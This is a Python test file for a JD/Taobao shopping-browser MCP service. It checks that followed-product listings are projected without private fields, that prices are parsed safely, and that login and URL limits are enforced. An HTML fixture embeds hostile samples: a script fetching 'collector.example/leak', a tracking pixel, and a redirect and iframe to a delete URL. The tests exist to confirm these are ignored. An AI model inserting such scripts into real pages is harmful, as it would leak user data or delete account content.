"""Synthetic followed-product projections and account read boundaries."""
import json
import time
import unittest
from types import SimpleNamespace
from unittest.mock import AsyncMock, patch

from jd_taobao_mcp.config import Settings
from jd_taobao_mcp.followed import FOLLOW_URL, followed_document_url, normalize_followed
from jd_taobao_mcp.safety import SafetyError, is_readable_url
from jd_taobao_mcp.service import ShoppingBrowserService


def fixture(page=1, total=25):
    """Generate only synthetic projected merchandise and explicit pager metadata."""
    rows = [{'href': f'//item.jd.com/{1000+i}.html?tracking=FAKE_PRIVATE',
             'title': f'Example product {i}', 'price_text': '¥20.50',
             'account': 'FAKE_ACCOUNT', 'price': '9999.00'}
            for i in range((page-1)*12, min(page*12, total))]
    return {'total': total, 'page_size': 12, 'current_page': page,
            'row_count': len(rows), 'items': rows}


def html_fixture(page=1, total=25):
    """Mirror the server-rendered list, including dangerous scripts and stale prices."""
    rows = ''.join(f'<div class="mf-goods-item"><div class="p-name">'
        f'<a href="{item["href"]}">{item["title"]}</a></div><div class="p-price">'
        f'<strong price="9999.00" data-estimated-price="1.00">{item["price_text"]}</strong>'
        '</div><a class="J-productUnfollow" href="https://t.jd.com/delete">Delete</a></div>'
        for item in fixture(page, total)['items'])
    return (rows + "<script>var pager = $('#paginationBottom').pager({"
            + f"total:parseInt('{total}'),pageSize:12,currentPage:parseInt('{page}'),"
            + "callback:function(){}});</script>"
            + '<script>fetch("https://collector.example/leak");location.href="https://t.jd.com/delete";</script>'
            + '<iframe src="https://t.jd.com/delete"></iframe><img src="https://collector.example/pixel">')


class FollowedContractTests(unittest.TestCase):
    def test_projection_excludes_private_fields_and_canonicalizes_links(self):
        result = normalize_followed(fixture(), 1)
        self.assertEqual(len(result['items']), 12)
        self.assertEqual(result['items'][0], {'title': 'Example product 0',
            'product_url': 'https://item.jd.com/1000.html', 'price': 20.5, 'price_label': '页面价格'})
        self.assertNotIn('FAKE_', json.dumps(result))
        self.assertFalse(result['partial'])
        self.assertEqual(result['reported_total'], 25)

    def test_unknown_prices_never_use_historical_or_estimated_attributes(self):
        data = fixture(total=3)
        data['items'][0]['price_text'] = '¥暂无报价'
        data['items'][1]['price_text'] = '¥0.00'
        data['items'][2]['href'] = 'javascript:evil()'
        result = normalize_followed(data, 1)
        self.assertEqual([r['price'] for r in result['items']], [None, 0])
        self.assertIsNone(result['items'][0]['price_label'])
        self.assertTrue(result['partial'])

    def test_empty_malformed_or_wrong_page_responses_are_distinct(self):
        self.assertTrue(normalize_followed(fixture(total=0), 1)['success'])
        for data in (None, {}, {**fixture(), 'total': True}, {**fixture(), 'page_size': True},
                     {**fixture(), 'current_page': 2}, {**fixture(), 'row_count': None}):
            self.assertFalse(normalize_followed(data, 1)['success'])
        data = fixture()
        data['items'][0] = None
        self.assertTrue(normalize_followed(data, 1)['partial'])
        data = fixture(total=0)
        data['total'] = 25
        self.assertTrue(normalize_followed(data, 1)['partial'])

    def test_only_fixed_bounded_document_urls_can_be_constructed(self):
        self.assertEqual(followed_document_url(2), FOLLOW_URL+'?index=2')
        self.assertFalse(is_readable_url(FOLLOW_URL))
        for value in (0, 11, True, '1', 'https://t.jd.com/delete'):
            with self.assertRaises(ValueError):
                followed_document_url(value)


class FollowedServiceTests(unittest.IsolatedAsyncioTestCase):
    async def test_limits_login_and_human_session_are_enforced(self):
        service = ShoppingBrowserService(Settings.from_env())
        browser = service.jd_browser
        browser.get_followed_products = AsyncMock(return_value={'success': True})
        for platform, count in (('taobao', 10), ('jd', True), ('jd', 0), ('jd', 101)):
            with self.assertRaises(ValueError):
                await service.get_followed_products(platform, count)
        browser.get_followed_products.assert_not_awaited()
        await service.get_followed_products('jd', 10)
        browser.get_followed_products.assert_awaited_once_with(10)
        del browser.get_followed_products
        browser._active_page_unlocked = AsyncMock()
        browser._context = SimpleNamespace(cookies=AsyncMock(return_value=[]))
        with patch('jd_taobao_mcp.browser.read_jd_followed', new_callable=AsyncMock) as read:
            self.assertEqual((await browser.get_followed_products(10))['status'], 'login_required')
            browser.login_until = time.monotonic()+60
            with self.assertRaises(SafetyError):
                await browser.get_followed_products(10)
            read.assert_not_awaited()

    async def test_stale_cookies_do_not_complete_a_login_still_on_passport(self):
        browser = ShoppingBrowserService(Settings.from_env()).jd_browser
        browser._page = SimpleNamespace(url='https://passport.jd.com/new/login.aspx')
        browser._context = SimpleNamespace(cookies=AsyncMock(return_value=[{
            'name': 'thor', 'value': 'FAKE_STALE', 'domain': '.jd.com', 'path': '/', 'expires': -1}]))
        with patch('jd_taobao_mcp.browser.save_cookies') as save:
            self.assertFalse(await browser.checkpoint_login())
            save.assert_not_called()
